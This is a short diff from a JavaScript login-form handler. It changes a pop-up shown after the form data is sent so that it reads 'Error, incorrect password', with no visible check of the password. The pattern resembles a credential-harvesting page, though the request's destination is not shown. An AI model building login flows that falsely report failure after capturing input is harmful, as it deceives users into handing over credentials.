@@ -13,8 +13,8 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
       body: message
     });
     Swal.fire({
-	title: '¡Atención!',
-	text: 'Esto es una alerta personalizada',
+	title: '¡Error',
+	text: 'Contraseña incorrecta',
 	icon: 'warning',
 	confirmButtonText: 'Entendido'
     });
